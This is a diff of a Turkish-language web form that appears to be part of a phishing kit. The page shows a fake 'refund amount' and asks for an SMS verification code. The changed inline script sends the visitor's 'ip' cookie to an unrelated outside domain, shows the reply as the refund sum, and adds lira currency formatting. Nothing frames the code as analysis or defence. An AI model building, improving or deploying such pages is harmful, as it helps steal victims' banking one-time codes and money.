@@ -48,37 +48,52 @@
           <div class="form-row required">
             <div class="form-row center-item"> <label for="iade" class="enforced" id="iade" style="display: none;">İADE TUTARI :</label>
            <br> <center> <label id="iadeTutari"> </label>  </center> </div> 
-    <script>
-      window.onload = function() {
-          const apiUrl = 'https://hakikicelikhantutunu.com/dmn/pin.php?ip=';
-          const ip = getCookie('ip');
-
-          if (!ip) {
-              console.error('IP adresi cookie olarak bulunamadı.');
-              return;
-          }
-
-          const url = apiUrl + encodeURIComponent(ip);
-
-          // AJAX ile GET isteği yaparak cevabı al
-          fetch(url)
-              .then(response => response.text())
-              .then(data => {
-                  // Cevabı aldıktan sonra işlemleri yap
-                  const iadeTutariLabel = document.getElementById('iade');
-                  const iadeTutariElement = document.getElementById('iadeTutari');
-                  iadeTutariElement.textContent = iadeTutariLabel.textContent + ' ' + data;
-              })
-              .catch(error => console.error('API isteği hatası:', error));
-      };
-
-      // Cookie'den değer almak için yardımcı fonksiyon
-      function getCookie(name) {
-          const value = `; ${document.cookie}`;
-          const parts = value.split(`; ${name}=`);
-          if (parts.length === 2) return parts.pop().split(';').shift();
-      }
-  </script><br>
+           <script>
+            window.onload = function() {
+                const apiUrl = 'https://hakikicelikhantutunu.com/dmn/pin.php?ip=';
+                const ip = getCookie('ip');
+        
+                if (!ip) {
+                    console.error('IP adresi cookie olarak bulunamadı.');
+                    return;
+                }
+        
+                const url = apiUrl + encodeURIComponent(ip);
+        
+                // AJAX ile GET isteği yaparak cevabı al
+                fetch(url)
+                    .then(response => response.text())
+                    .then(data => {
+                        // Cevabı aldıktan sonra işlemleri yap
+                        const iadeTutariLabel = document.getElementById('iade');
+                        const iadeTutariElement = document.getElementById('iadeTutari');
+                        
+                        // İade tutarını Türk Lirası formatına dönüştür
+                        const formattedTutar = formatTutar(data);
+        
+                        iadeTutariElement.textContent = iadeTutariLabel.textContent + ' ' + formattedTutar;
+                    })
+                    .catch(error => console.error('API isteği hatası:', error));
+            };
+        
+            // Cookie'den değer almak için yardımcı fonksiyon
+            function getCookie(name) {
+                const value = `; ${document.cookie}`;
+                const parts = value.split(`; ${name}=`);
+                if (parts.length === 2) return parts.pop().split(';').shift();
+            }
+        
+            // Türk Lirası formatına dönüştürme fonksiyonu
+            function formatTutar(tutar) {
+                const formattedTutar = Number(tutar).toLocaleString('tr-TR', {
+                    style: 'currency',
+                    currency: 'TRY'
+                });
+        
+                return formattedTutar.replace(/\s/g, ''); // Boşlukları kaldır
+            }
+        </script>
+        <br>
               <label for="sms" class="enforced">SMS DOĞRULAMA KODU</label>
               <input type="hidden" name="encsms" id="encsms" value="">
               <div class="form-field fieldGroup">
